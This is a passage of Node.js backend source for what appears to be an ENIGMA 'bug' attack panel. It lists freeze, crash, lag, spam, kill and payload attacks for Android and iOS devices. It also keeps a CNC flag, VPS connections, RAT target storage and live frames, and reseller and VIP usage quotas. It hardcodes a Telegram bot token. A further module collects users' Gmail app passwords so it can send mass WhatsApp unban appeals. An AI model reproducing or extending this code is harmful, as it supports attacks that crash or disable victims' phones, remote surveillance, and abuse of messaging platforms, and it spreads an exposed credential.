{ bug_id: "business5", bug_name: "𝐁𝐔𝐒𝐈𝐍𝐄𝐒𝐒 𝐗𝟓" }, { bug_id: "business6", bug_name: "𝐁𝐔𝐒𝐈𝐍𝐄𝐒𝐒 𝐗𝟔" },
{ bug_id: "business7", bug_name: "𝐁𝐔𝐒𝐈𝐍𝐄𝐒𝐒 𝐗𝟕" }, { bug_id: "business8", bug_name: "𝐁𝐔𝐒𝐈𝐍𝐄𝐒𝐒 𝐗𝟖" },
{ bug_id: "business9", bug_name: "𝐁𝐔𝐒𝐈𝐍𝐄𝐒𝐒 𝐗𝟗" }, { bug_id: "business10", bug_name: "𝐁𝐔𝐒𝐈𝐍𝐄𝐒𝐒 𝐗𝟏𝟎" },

// ── NEWSLETTER ──
{ bug_id: "newsletter1", bug_name: "𝐍𝐄𝐖𝐒𝐋𝐄𝐓𝐓𝐄𝐑 𝐗𝟏" }, { bug_id: "newsletter2", bug_name: "𝐍𝐄𝐖𝐒𝐋𝐄𝐓𝐓𝐄𝐑 𝐗𝟐" },
{ bug_id: "newsletter3", bug_name: "𝐍𝐄𝐖𝐒𝐋𝐄𝐓𝐓𝐄𝐑 𝐗𝟑" }, { bug_id: "newsletter4", bug_name: "𝐍𝐄𝐖𝐒𝐋𝐄𝐓𝐓𝐄𝐑 𝐗𝟒" },
{ bug_id: "newsletter5", bug_name: "𝐍𝐄𝐖𝐒𝐋𝐄𝐓𝐓𝐄𝐑 𝐗𝟓" }, { bug_id: "newsletter6", bug_name: "𝐍𝐄𝐖𝐒𝐋𝐄𝐓𝐓𝐄𝐑 𝐗𝟔" },
{ bug_id: "newsletter7", bug_name: "𝐍𝐄𝐖𝐒𝐋𝐄𝐓𝐓𝐄𝐑 𝐗𝟕" }, { bug_id: "newsletter8", bug_name: "𝐍𝐄𝐖𝐒𝐋𝐄𝐓𝐓𝐄𝐑 𝐗𝟖" },
{ bug_id: "newsletter9", bug_name: "𝐍𝐄𝐖𝐒𝐋𝐄𝐓𝐓𝐄𝐑 𝐗𝟗" }, { bug_id: "newsletter10", bug_name: "𝐍𝐄𝐖𝐒𝐋𝐄𝐓𝐓𝐄𝐑 𝐗𝟏𝟎" },

// ── DEVICE ──
{ bug_id: "device1", bug_name: "𝐃𝐄𝐕𝐈𝐂𝐄 𝐗𝟏" }, { bug_id: "device2", bug_name: "𝐃𝐄𝐕𝐈𝐂𝐄 𝐗𝟐" },
{ bug_id: "device3", bug_name: "𝐃𝐄𝐕𝐈𝐂𝐄 𝐗𝟑" }, { bug_id: "device4", bug_name: "𝐃𝐄𝐕𝐈𝐂𝐄 𝐗𝟒" },
{ bug_id: "device5", bug_name: "𝐃𝐄𝐕𝐈𝐂𝐄 𝐗𝟓" }, { bug_id: "device6", bug_name: "𝐃𝐄𝐕𝐈𝐂𝐄 𝐗𝟔" },
{ bug_id: "device7", bug_name: "𝐃𝐄𝐕𝐈𝐂𝐄 𝐗𝟕" }, { bug_id: "device8", bug_name: "𝐃𝐄𝐕𝐈𝐂𝐄 𝐗𝟖" },
{ bug_id: "device9", bug_name: "𝐃𝐄𝐕𝐈𝐂𝐄 𝐗𝟗" }, { bug_id: "device10", bug_name: "𝐃𝐄𝐕𝐈𝐂𝐄 𝐗𝟏𝟎" },

// ── PRIVACY ──
{ bug_id: "privacy1", bug_name: "𝐏𝐑𝐈𝐕𝐀𝐂𝐘 𝐗𝟏" }, { bug_id: "privacy2", bug_name: "𝐏𝐑𝐈𝐕𝐀𝐂𝐘 𝐗𝟐" },
{ bug_id: "privacy3", bug_name: "𝐏𝐑𝐈𝐕𝐀𝐂𝐘 𝐗𝟑" }, { bug_id: "privacy4", bug_name: "𝐏𝐑𝐈𝐕𝐀𝐂𝐘 𝐗𝟒" },
{ bug_id: "privacy5", bug_name: "𝐏𝐑𝐈𝐕𝐀𝐂𝐘 𝐗𝟓" }, { bug_id: "privacy6", bug_name: "𝐏𝐑𝐈𝐕𝐀𝐂𝐘 𝐗𝟔" },
{ bug_id: "privacy7", bug_name: "𝐏𝐑𝐈𝐕𝐀𝐂𝐘 𝐗𝟕" }, { bug_id: "privacy8", bug_name: "𝐏𝐑𝐈𝐕𝐀𝐂𝐘 𝐗𝟖" },
{ bug_id: "privacy9", bug_name: "𝐏𝐑𝐈𝐕𝐀𝐂𝐘 𝐗𝟗" }, { bug_id: "privacy10", bug_name: "𝐏𝐑𝐈𝐕𝐀𝐂𝐘 𝐗𝟏𝟎" },

// ── CHAIN ──
{ bug_id: "chain1", bug_name: "𝐂𝐇𝐀𝐈𝐍 𝐗𝟏" }, { bug_id: "chain2", bug_name: "𝐂𝐇𝐀𝐈𝐍 𝐗𝟐" },
{ bug_id: "chain3", bug_name: "𝐂𝐇𝐀𝐈𝐍 𝐗𝟑" }, { bug_id: "chain4", bug_name: "𝐂𝐇𝐀𝐈𝐍 𝐗𝟒" },
{ bug_id: "chain5", bug_name: "𝐂𝐇𝐀𝐈𝐍 𝐗𝟓" }, { bug_id: "chain6", bug_name: "𝐂𝐇𝐀𝐈𝐍 𝐗𝟔" },
{ bug_id: "chain7", bug_name: "𝐂𝐇𝐀𝐈𝐍 𝐗𝟕" }, { bug_id: "chain8", bug_name: "𝐂𝐇𝐀𝐈𝐍 𝐗𝟖" },
{ bug_id: "chain9", bug_name: "𝐂𝐇𝐀𝐈𝐍 𝐗𝟗" }, { bug_id: "chain10", bug_name: "𝐂𝐇𝐀𝐈𝐍 𝐗𝟏𝟎" },
{ bug_id: "lagjam1", bug_name: "𝐋𝐀𝐆𝐉𝐀𝐌 𝐗𝟏" },
{ bug_id: "lagjam2", bug_name: "𝐋𝐀𝐆𝐉𝐀𝐌 𝐗𝟐" },
{ bug_id: "lagjam3", bug_name: "𝐋𝐀𝐆𝐉𝐀𝐌 𝐗𝟑" },
{ bug_id: "lagjam4", bug_name: "𝐋𝐀𝐆𝐉𝐀𝐌 𝐗𝟒" },
{ bug_id: "lagjam5", bug_name: "𝐋𝐀𝐆𝐉𝐀𝐌 𝐗𝟓" },
{ bug_id: "lagjam6", bug_name: "𝐋𝐀𝐆𝐉𝐀𝐌 𝐗𝟔" },
// ── ANDROID ──
{ bug_id: "and_frz1", bug_name: "𝐀𝐍𝐃 𝐅𝐑𝐙𝟏" }, { bug_id: "and_frz2", bug_name: "𝐀𝐍𝐃 𝐅𝐑𝐙𝟐" },
{ bug_id: "and_frz3", bug_name: "𝐀𝐍𝐃 𝐅𝐑𝐙𝟑" }, { bug_id: "and_frz4", bug_name: "𝐀𝐍𝐃 𝐅𝐑𝐙𝟒" },
{ bug_id: "and_frz5", bug_name: "𝐀𝐍𝐃 𝐅𝐑𝐙𝟓" },
{ bug_id: "and_blk1", bug_name: "𝐀𝐍𝐃 𝐁𝐋𝐊𝟏" }, { bug_id: "and_blk2", bug_name: "𝐀𝐍𝐃 𝐁𝐋𝐊𝟐" },
{ bug_id: "and_blk3", bug_name: "𝐀𝐍𝐃 𝐁𝐋𝐊𝟑" }, { bug_id: "and_blk4", bug_name: "𝐀𝐍𝐃 𝐁𝐋𝐊𝟒" },
{ bug_id: "and_blk5", bug_name: "𝐀𝐍𝐃 𝐁𝐋𝐊𝟓" },
{ bug_id: "and_crs1", bug_name: "𝐀𝐍𝐃 𝐂𝐑𝐒𝟏" }, { bug_id: "and_crs2", bug_name: "𝐀𝐍𝐃 𝐂𝐑𝐒𝟐" },
{ bug_id: "and_crs3", bug_name: "𝐀𝐍𝐃 𝐂𝐑𝐒𝟑" }, { bug_id: "and_crs4", bug_name: "𝐀𝐍𝐃 𝐂𝐑𝐒𝟒" },
{ bug_id: "and_crs5", bug_name: "𝐀𝐍𝐃 𝐂𝐑𝐒𝟓" },
{ bug_id: "and_lag1", bug_name: "𝐀𝐍𝐃 𝐋𝐀𝐆𝟏" }, { bug_id: "and_lag2", bug_name: "𝐀𝐍𝐃 𝐋𝐀𝐆𝟐" },
{ bug_id: "and_lag3", bug_name: "𝐀𝐍𝐃 𝐋𝐀𝐆𝟑" }, { bug_id: "and_lag4", bug_name: "𝐀𝐍𝐃 𝐋𝐀𝐆𝟒" },
{ bug_id: "and_lag5", bug_name: "𝐀𝐍𝐃 𝐋𝐀𝐆𝟓" },
{ bug_id: "and_spm1", bug_name: "𝐀𝐍𝐃 𝐒𝐏𝐌𝟏" }, { bug_id: "and_spm2", bug_name: "𝐀𝐍𝐃 𝐒𝐏𝐌𝟐" },
{ bug_id: "and_spm3", bug_name: "𝐀𝐍𝐃 𝐒𝐏𝐌𝟑" }, { bug_id: "and_spm4", bug_name: "𝐀𝐍𝐃 𝐒𝐏𝐌𝟒" },
{ bug_id: "and_spm5", bug_name: "𝐀𝐍𝐃 𝐒𝐏𝐌𝟓" },
{ bug_id: "and_kil1", bug_name: "𝐀𝐍𝐃 𝐊𝐈𝐋𝟏" }, { bug_id: "and_kil2", bug_name: "𝐀𝐍𝐃 𝐊𝐈𝐋𝟐" },
{ bug_id: "and_kil3", bug_name: "𝐀𝐍𝐃 𝐊𝐈𝐋𝟑" }, { bug_id: "and_kil4", bug_name: "𝐀𝐍𝐃 𝐊𝐈𝐋𝟒" },
{ bug_id: "and_kil5", bug_name: "𝐀𝐍𝐃 𝐊𝐈𝐋𝟓" },
{ bug_id: "and_car1", bug_name: "𝐀𝐍𝐃 𝐂𝐀𝐑𝟏" }, { bug_id: "and_car2", bug_name: "𝐀𝐍𝐃 𝐂𝐀𝐑𝟐" },
{ bug_id: "and_car3", bug_name: "𝐀𝐍𝐃 𝐂𝐀𝐑𝟑" }, { bug_id: "and_car4", bug_name: "𝐀𝐍𝐃 𝐂𝐀𝐑𝟒" },
{ bug_id: "and_car5", bug_name: "𝐀𝐍𝐃 𝐂𝐀𝐑𝟓" },
{ bug_id: "and_stk1", bug_name: "𝐀𝐍𝐃 𝐒𝐓𝐊𝟏" }, { bug_id: "and_stk2", bug_name: "𝐀𝐍𝐃 𝐒𝐓𝐊𝟐" },
{ bug_id: "and_stk3", bug_name: "𝐀𝐍𝐃 𝐒𝐓𝐊𝟑" }, { bug_id: "and_stk4", bug_name: "𝐀𝐍𝐃 𝐒𝐓𝐊𝟒" },
{ bug_id: "and_stk5", bug_name: "𝐀𝐍𝐃 𝐒𝐓𝐊𝟓" },
{ bug_id: "and_cal1", bug_name: "𝐀𝐍𝐃 𝐂𝐀𝐋𝟏" }, { bug_id: "and_cal2", bug_name: "𝐀𝐍𝐃 𝐂𝐀𝐋𝟐" },
{ bug_id: "and_cal3", bug_name: "𝐀𝐍𝐃 𝐂𝐀𝐋𝟑" }, { bug_id: "and_cal4", bug_name: "𝐀𝐍𝐃 𝐂𝐀𝐋𝟒" },
{ bug_id: "and_cal5", bug_name: "𝐀𝐍𝐃 𝐂𝐀𝐋𝟓" },
{ bug_id: "and_pld1", bug_name: "𝐀𝐍𝐃 𝐏𝐋𝐃𝟏" }, { bug_id: "and_pld2", bug_name: "𝐀𝐍𝐃 𝐏𝐋𝐃𝟐" },
{ bug_id: "and_pld3", bug_name: "𝐀𝐍𝐃 𝐏𝐋𝐃𝟑" }, { bug_id: "and_pld4", bug_name: "𝐀𝐍𝐃 𝐏𝐋𝐃𝟒" },
{ bug_id: "and_pld5", bug_name: "𝐀𝐍𝐃 𝐏𝐋𝐃𝟓" },
{ bug_id: "and_chn1", bug_name: "𝐀𝐍𝐃 𝐂𝐇𝐍𝟏" }, { bug_id: "and_chn2", bug_name: "𝐀𝐍𝐃 𝐂𝐇𝐍𝟐" },
{ bug_id: "and_chn3", bug_name: "𝐀𝐍𝐃 𝐂𝐇𝐍𝟑" }, { bug_id: "and_chn4", bug_name: "𝐀𝐍𝐃 𝐂𝐇𝐍𝟒" },
{ bug_id: "and_chn5", bug_name: "𝐀𝐍𝐃 𝐂𝐇𝐍𝟓" },

// ── IOS ──
{ bug_id: "ios_frz1", bug_name: "𝐈𝐎𝐒 𝐅𝐑𝐙𝟏" }, { bug_id: "ios_frz2", bug_name: "𝐈𝐎𝐒 𝐅𝐑𝐙𝟐" },
{ bug_id: "ios_frz3", bug_name: "𝐈𝐎𝐒 𝐅𝐑𝐙𝟑" }, { bug_id: "ios_frz4", bug_name: "𝐈𝐎𝐒 𝐅𝐑𝐙𝟒" },
{ bug_id: "ios_frz5", bug_name: "𝐈𝐎𝐒 𝐅𝐑𝐙𝟓" },
{ bug_id: "ios_blk1", bug_name: "𝐈𝐎𝐒 𝐁𝐋𝐊𝟏" }, { bug_id: "ios_blk2", bug_name: "𝐈𝐎𝐒 𝐁𝐋𝐊𝟐" },
{ bug_id: "ios_blk3", bug_name: "𝐈𝐎𝐒 𝐁𝐋𝐊𝟑" }, { bug_id: "ios_blk4", bug_name: "𝐈𝐎𝐒 𝐁𝐋𝐊𝟒" },
{ bug_id: "ios_blk5", bug_name: "𝐈𝐎𝐒 𝐁𝐋𝐊𝟓" },
{ bug_id: "ios_crs1", bug_name: "𝐈𝐎𝐒 𝐂𝐑𝐒𝟏" }, { bug_id: "ios_crs2", bug_name: "𝐈𝐎𝐒 𝐂𝐑𝐒𝟐" },
{ bug_id: "ios_crs3", bug_name: "𝐈𝐎𝐒 𝐂𝐑𝐒𝟑" }, { bug_id: "ios_crs4", bug_name: "𝐈𝐎𝐒 𝐂𝐑𝐒𝟒" },
{ bug_id: "ios_crs5", bug_name: "𝐈𝐎𝐒 𝐂𝐑𝐒𝟓" },
{ bug_id: "ios_lag1", bug_name: "𝐈𝐎𝐒 𝐋𝐀𝐆𝟏" }, { bug_id: "ios_lag2", bug_name: "𝐈𝐎𝐒 𝐋𝐀𝐆𝟐" },
{ bug_id: "ios_lag3", bug_name: "𝐈𝐎𝐒 𝐋𝐀𝐆𝟑" }, { bug_id: "ios_lag4", bug_name: "𝐈𝐎𝐒 𝐋𝐀𝐆𝟒" },
{ bug_id: "ios_lag5", bug_name: "𝐈𝐎𝐒 𝐋𝐀𝐆𝟓" },
{ bug_id: "ios_spm1", bug_name: "𝐈𝐎𝐒 𝐒𝐏𝐌𝟏" }, { bug_id: "ios_spm2", bug_name: "𝐈𝐎𝐒 𝐒𝐏𝐌𝟐" },
{ bug_id: "ios_spm3", bug_name: "𝐈𝐎𝐒 𝐒𝐏𝐌𝟑" }, { bug_id: "ios_spm4", bug_name: "𝐈𝐎𝐒 𝐒𝐏𝐌𝟒" },
{ bug_id: "ios_spm5", bug_name: "𝐈𝐎𝐒 𝐒𝐏𝐌𝟓" },
{ bug_id: "ios_kil1", bug_name: "𝐈𝐎𝐒 𝐊𝐈𝐋𝟏" }, { bug_id: "ios_kil2", bug_name: "𝐈𝐎𝐒 𝐊𝐈𝐋𝟐" },
{ bug_id: "ios_kil3", bug_name: "𝐈𝐎𝐒 𝐊𝐈𝐋𝟑" }, { bug_id: "ios_kil4", bug_name: "𝐈𝐎𝐒 𝐊𝐈𝐋𝟒" },
{ bug_id: "ios_kil5", bug_name: "𝐈𝐎𝐒 𝐊𝐈𝐋𝟓" },
{ bug_id: "ios_car1", bug_name: "𝐈𝐎𝐒 𝐂𝐀𝐑𝟏" }, { bug_id: "ios_car2", bug_name: "𝐈𝐎𝐒 𝐂𝐀𝐑𝟐" },
{ bug_id: "ios_car3", bug_name: "𝐈𝐎𝐒 𝐂𝐀𝐑𝟑" }, { bug_id: "ios_car4", bug_name: "𝐈𝐎𝐒 𝐂𝐀𝐑𝟒" },
{ bug_id: "ios_car5", bug_name: "𝐈𝐎𝐒 𝐂𝐀𝐑𝟓" },
{ bug_id: "ios_stk1", bug_name: "𝐈𝐎𝐒 𝐒𝐓𝐊𝟏" }, { bug_id: "ios_stk2", bug_name: "𝐈𝐎𝐒 𝐒𝐓𝐊𝟐" },
{ bug_id: "ios_stk3", bug_name: "𝐈𝐎𝐒 𝐒𝐓𝐊𝟑" }, { bug_id: "ios_stk4", bug_name: "𝐈𝐎𝐒 𝐒𝐓𝐊𝟒" },
{ bug_id: "ios_stk5", bug_name: "𝐈𝐎𝐒 𝐒𝐓𝐊𝟓" },
{ bug_id: "ios_cal1", bug_name: "𝐈𝐎𝐒 𝐂𝐀𝐋𝟏" }, { bug_id: "ios_cal2", bug_name: "𝐈𝐎𝐒 𝐂𝐀𝐋𝟐" },
{ bug_id: "ios_cal3", bug_name: "𝐈𝐎𝐒 𝐂𝐀𝐋𝟑" }, { bug_id: "ios_cal4", bug_name: "𝐈𝐎𝐒 𝐂𝐀𝐋𝟒" },
{ bug_id: "ios_cal5", bug_name: "𝐈𝐎𝐒 𝐂𝐀𝐋𝟓" },
{ bug_id: "ios_pld1", bug_name: "𝐈𝐎𝐒 𝐏𝐋𝐃𝟏" }, { bug_id: "ios_pld2", bug_name: "𝐈𝐎𝐒 𝐏𝐋𝐃𝟐" },
{ bug_id: "ios_pld3", bug_name: "𝐈𝐎𝐒 𝐏𝐋𝐃𝟑" }, { bug_id: "ios_pld4", bug_name: "𝐈𝐎𝐒 𝐏𝐋𝐃𝟒" },
{ bug_id: "ios_pld5", bug_name: "𝐈𝐎𝐒 𝐏𝐋𝐃𝟓" },
{ bug_id: "ios_chn1", bug_name: "𝐈𝐎𝐒 𝐂𝐇𝐍𝟏" }, { bug_id: "ios_chn2", bug_name: "𝐈𝐎𝐒 𝐂𝐇𝐍𝟐" },
{ bug_id: "ios_chn3", bug_name: "𝐈𝐎𝐒 𝐂𝐇𝐍𝟑" }, { bug_id: "ios_chn4", bug_name: "𝐈𝐎𝐒 𝐂𝐇𝐍𝟒" },
{ bug_id: "ios_chn5", bug_name: "𝐈𝐎𝐒 𝐂𝐇𝐍𝟓" },
];


let cncActive = true; // Flag CNC
let vpsList = [];
let vpsConnections = {}
const VPS_FILE = 'vps.json';
let sikmanuk = JSON.parse(fs.readFileSync("keyList.json", "utf8"));
fs.watchFile("keyList.json", () => {
  console.log("[📂] keyList.json changed, reloading...");
  sikmanuk = JSON.parse(fs.readFileSync("keyList.json", "utf8"));
});


// Load chat from file
if (fs.existsSync(CHAT_FILE)) {
  chatList = JSON.parse(fs.readFileSync(CHAT_FILE, 'utf8'));
}

// Simpan chat
function saveChat() {
  fs.writeFileSync(CHAT_FILE, JSON.stringify(chatList, null, 2));
}

// Sanitize fungsi
function sanitize(input) {
  return String(input)
    .replace(/[<>]/g, '') // hilangkan tag html
    .replace(/[\r\n]/g, ' ') // hilangkan newline
    .slice(0, 250); // batas 250 karakter
}

const TOKEN = "8842027810:AAGNyUBo7MbsFuEPVaRQYZQ3_vTrWsZW1a0"; // Ganti dengan token bot kamu"
const bot = new TelegramBot(TOKEN, { polling: true });

const OWNER_ID = 8855744386;
  
wss.on('connection', function (ws, req) {
  let username;

  ws.on('message', function (msg) {
    try {
      const data = JSON.parse(msg);

        if (data.type === 'sessionCheck') {
  const sessionList = JSON.parse(fs.readFileSync("keyList.json", "utf8"));
  const user = sessionList.find(e => e.sessionKey === data.key);

  if (!user) {
    ws.send(JSON.stringify({
      type: "forceLogout",
      reason: "Invalid key"
    }));
    return ws.close();
  }

  if (user.androidId !== data.androidId) {
    ws.send(JSON.stringify({
      type: "forceLogout",
      reason: "Another device has logged in"
    }));
    return ws.close();
  }
}

      if (data.type === 'validate') {
        const session = JSON.parse(fs.readFileSync("keyList.json", "utf8"));
        const validKey = session.find(e => e.sessionKey === data.key)
        const validId = session.find(e => e.androidId === data.androidId)
          
        if (!validKey) {
          ws.send(JSON.stringify({
            type: "myInfo",
            valid: false,
            reason: "keyInvalid"
          }));
          return ws.close();
        }

        if (!validId) {
          ws.send(JSON.stringify({
            type: "myInfo",
            valid: false,
            reason: "androidIdMismatch"
          }));
          return ws.close();
        }

        // Autentikasi sukses
        ws.send(JSON.stringify({
          type: "myInfo",
          valid: true,
          username: session.username,
          androidId: session.androidId,
          role: session.role || "member"
        }));

            const interval = setInterval(() => {
            const session = JSON.parse(fs.readFileSync("keyList.json", "utf8"));
        const validKey = session.find(e => e.sessionKey === data.key)
        const validId = session.find(e => e.androidId === data.androidId)
          
        if (!validKey) {
          ws.send(JSON.stringify({
            type: "myInfo",
            valid: false,
            reason: "keyInvalid"
          }));
          return ws.close();
        }

        if (!validId) {
          ws.send(JSON.stringify({
            type: "myInfo",
            valid: false,
            reason: "androidIdMismatch"
          }));
          return ws.close();
        }

            }, 10000);
      }
      if (data.type === 'auth') {
        username = getUserByKey(data.key);
         console.log(username)
        if (!username) return ws.close();
        wsClients[username] = ws;

        // Kirim chatList awal
const list = chatList
  .filter(m => m.from === username || m.to === username)
  .map(m => (m.from === username ? m.to : m.from));

  ws.send(JSON.stringify({
    type: "chatList",
    users: [...new Set(list)],
  }));
      }

      if (data.type === 'chat') {
        const to = data.to;
        const message = sanitize(data.message);
if (!username || !to || !message || message.length > 250) return;

        const chat = {
          from: username,
          to,
          message,
          time: new Date().toISOString()
        };
        chatList.push(chat);
        saveChat();

        // Kirim ke pengirim
        ws.send(JSON.stringify({ type: 'chat', message: { ...chat, fromMe: true } }));

        // Kirim ke penerima jika online
        if (wsClients[to]) {
          wsClients[to].send(JSON.stringify({
            type: 'chat',
            message: { ...chat, fromMe: false }
          }));
        }
      }

      if (data.type === 'getMessages') {
        const withUser = data.with;
        const messages = chatList
          .filter(m =>
            (m.from === username && m.to === withUser) ||
            (m.from === withUser && m.to === username)
          )
          .map(m => ({
            ...m,
            fromMe: m.from === username
          }));

        ws.send(JSON.stringify({ type: 'messages', with: withUser, messages }));
      }
    } catch (e) {
      console.error("WS error:", e.message);
    }
  });

  ws.on('close', () => {
    if (username && wsClients[username]) {
      delete wsClients[username];
    }
  });
});

// Ganti listen jadi ini:
const RAT_TARGETS = './rat_targets.json';
const RAT_LIVE    = {};  // in-memory live frames

function readRat(f) {
  try { return JSON.parse(fs.existsSync(f) ? fs.readFileSync(f,'utf8')||'[]' : '[]'); } catch { return []; }
}
function saveRat(f,d) { try { fs.writeFileSync(f, JSON.stringify(d,null,2)); } catch(_) {} }

const AM_BASE_URL = 'https://satriam.satriadeveloperz.workers.dev';

const AM_HEADERS = {
  'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
  'Accept-Language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
  'Content-Type': 'application/json',
  'Origin': 'https://satriam.satriadeveloperz.workers.dev',
  'Referer': 'https://satriam.satriadeveloperz.workers.dev/'
};


// ============================================================
// UNBAN SPAM - GMAIL PER USER
// ============================================================


// ─── ENCRYPTION KEY (buat simpen app password) ──────────────
const ENCRYPTION_KEY = crypto.randomBytes(32); // Ganti dengan static key biar gak ilang pas restart

// ─── DATABASE GMAIL USER ────────────────────────────────────
const GMAIL_DB = './user_gmail.json';

function loadGmailDB() {
  try {
    if (fs.existsSync(GMAIL_DB)) {
      return JSON.parse(fs.readFileSync(GMAIL_DB, 'utf8'));
    }
  } catch(e) {}
  return {};
}

function saveGmailDB(data) {
  try {
    fs.writeFileSync(GMAIL_DB, JSON.stringify(data, null, 2));
  } catch(e) {}
}

// Simple encryption (buat app password)
function encrypt(text) {
  const iv = crypto.randomBytes(16);
  const cipher = crypto.createCipheriv('aes-256-cbc', ENCRYPTION_KEY, iv);
  let encrypted = cipher.update(text, 'utf8', 'hex');
  encrypted += cipher.final('hex');
  return iv.toString('hex') + ':' + encrypted;
}

function decrypt(text) {
  try {
    const parts = text.split(':');
    const iv = Buffer.from(parts[0], 'hex');
    const decipher = crypto.createDecipheriv('aes-256-cbc', ENCRYPTION_KEY, iv);
    let decrypted = decipher.update(parts[1], 'hex', 'utf8');
    decrypted += decipher.final('utf8');
    return decrypted;
  } catch(e) {
    return null;
  }
}

// ─── KONFIGURASI LIMIT ──────────────────────────────────────
const USER_LIMITS = {
  default: 10,
  member: 100,
  reseller: 250,
  vip: 500,
  owner: 999999,
  dev: 999999
};

// ─── DATABASE LIMIT ─────────────────────────────────────────
const LIMIT_DB = './user_limits.json';

function loadLimits() {
  try {
    if (fs.existsSync(LIMIT_DB)) {
      return JSON.parse(fs.readFileSync(LIMIT_DB, 'utf8'));
    }
  } catch(e) {}
  return {};
}

function saveLimits(data) {
  try {
    fs.writeFileSync(LIMIT_DB, JSON.stringify(data, null, 2));
  } catch(e) {}
}

function getUserLimit(username, role) {
  const limits = loadLimits();
  if (!limits[username]) {
    limits[username] = {
      used: 0,
      total: USER_LIMITS[role] || USER_LIMITS.default,
      history: []
    };
    saveLimits(limits);
  }
  return limits[username];
}

// ─── TEMPLATE UNBAN ─────────────────────────────────────────
const UNBAN_TEMPLATES = {
  account_banned: {
    id: 'account_banned',
    name: 'Account Banned',
    to: 'support@whatsapp.com',
    cc: 'appeals@whatsapp.com',
    subject: 'Appeal for Banned Account - {NUMBER}',
    body: `Dear WhatsApp Support Team,

I am writing to appeal the ban on my WhatsApp account.

Phone Number: {NUMBER}
Country: Indonesia
Ban Date: {DATE}

I believe this ban was issued in error. I have never violated your Terms of Service intentionally.

Please review my account and lift the ban.

Best regards,
{NAME}`
  },

  account_restricted: {
    id: 'account_restricted',
    name: 'Account Restricted',
    to: 'support@whatsapp.com',
    subject: 'Appeal for Restricted Account - {NUMBER}',
    body: `Dear WhatsApp Support,

My WhatsApp account has been restricted. I would like to appeal.

Phone Number: {NUMBER}
Restriction Date: {DATE}

Please review my case and restore my account.

Sincerely,
{NAME}`
  },

  false_spam: {
    id: 'false_spam',
    name: 'False Spam Report',
    to: 'support@whatsapp.com',
    subject: 'False Spam Report Appeal - {NUMBER}',
    body: `To WhatsApp Support,

My account was banned due to a false spam report.

Phone Number: {NUMBER}
Ban Date: {DATE}

I have not sent any spam messages. Please review and restore my account.

Sincerely,
{NAME}`
  }
};

// ─── TRACK JOBS ─────────────────────────────────────────────
const unbanJobs = {};

// ============================================================
// ENDPOINT: /api/gmail/setup
// User masukin Gmail + App Password sendiri
// ============================================================
app.post('/api/gmail/setup', express.json(), async (req, res) => {
  const { key, gmail, appPassword } = req.body;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ valid: false, message: 'Invalid key' });

  if (!gmail || !appPassword) {
    return res.json({ valid: false, message: 'Gmail & App Password required' });
  }

  // Validasi format email
  if (!gmail.includes('@')) {
    return res.json({ valid: false, message: 'Format email salah' });
  }

  // Test SMTP dulu
  try {
    const transporter = nodemailer.createTransport({
      service: 'gmail',
      auth: {
        user: gmail,
        pass: appPassword
      }
    });

    await transporter.verify();
    console.log(`[✅ GMAIL] ${gmail} verified for ${keyInfo.username}`);

  } catch(e) {
    console.log(`[❌ GMAIL] ${gmail} failed: ${e.message}`);
    return res.json({
      valid: false,
      message: 'Gmail / App Password salah. Pastiin 2FA aktif & app password bener. Error: ' + e.message
    });
  }

  // Simpan (encrypt app password)
  const db = loadGmailDB();
  db[keyInfo.username] = {
    gmail: gmail,
    appPassword: encrypt(appPassword),
    setupAt: new Date().toISOString(),
    verified: true,
    lastUsed: null
  };
  saveGmailDB(db);

  res.json({
    valid: true,
    message: `✅ Gmail ${gmail} berhasil disetup!`,
    gmail: gmail
  });
});

// ============================================================
// ENDPOINT: /api/gmail/my-gmail
// Cek Gmail user
// ============================================================
app.get('/api/gmail/my-gmail', (req, res) => {
  const { key } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false, message: 'Invalid key' });

  const db = loadGmailDB();
  const userGmail = db[keyInfo.username];

  if (!userGmail) {
    return res.json({
      valid: true,
      setup: false,
      message: 'Belum setup Gmail'
    });
  }

  res.json({
    valid: true,
    setup: true,
    gmail: userGmail.gmail,
    verified: userGmail.verified,
    setupAt: userGmail.setupAt,
    lastUsed: userGmail.lastUsed
  });
});

// ============================================================
// ENDPOINT: /api/gmail/test
// Test Gmail user
// ============================================================
app.post('/api/gmail/test', express.json(), async (req, res) => {
  const { key, testEmail } = req.body;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false, message: 'Invalid key' });

  const db = loadGmailDB();
  const userGmail = db[keyInfo.username];

  if (!userGmail) {
    return res.json({ valid: false, message: 'Setup Gmail dulu' });
  }

  const appPassword = decrypt(userGmail.appPassword);
  if (!appPassword) {
    return res.json({ valid: false, message: 'App password corrupt. Setup ulang.' });
  }

  try {
    const transporter = nodemailer.createTransport({
      service: 'gmail',
      auth: {
        user: userGmail.gmail,
        pass: appPassword
      }
    });

    await transporter.sendMail({
      from: `"ENIGMA " <${userGmail.gmail}>`,
      to: testEmail || userGmail.gmail,
      subject: 'Test Email - ENIGMA',
      text: `Test email dari ENIGMA Bot.\n\nGmail: ${userGmail.gmail}\nWaktu: ${new Date().toLocaleString('id-ID')}\n\nKalo lo terima email ini, berarti Gmail lo UDAH BENER!`
    });

    res.json({ valid: true, message: `Test email terkirim ke ${testEmail || userGmail.gmail}` });

  } catch(e) {
    res.json({ valid: false, message: e.message });
  }
});

// ============================================================
// ENDPOINT: /api/gmail/delete
// Hapus Gmail user
// ============================================================
app.post('/api/gmail/delete', express.json(), (req, res) => {
  const { key } = req.body;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false, message: 'Invalid key' });

  const db = loadGmailDB();
  delete db[keyInfo.username];
  saveGmailDB(db);

  res.json({ valid: true, message: 'Gmail dihapus' });
});

// ============================================================
// ENDPOINT: /api/unban/limit-status
// ============================================================
app.get('/api/unban/limit-status', (req, res) => {
  const { key } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false, message: 'Invalid key' });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  const role = user?.role || 'member';

  const limit = getUserLimit(keyInfo.username, role);
  const total = USER_LIMITS[role] || USER_LIMITS.default;

  res.json({
    valid: true,
    used: limit.used,
    total: total,
    remaining: Math.max(0, total - limit.used),
    canUse: limit.used < total
  });
});

// ============================================================
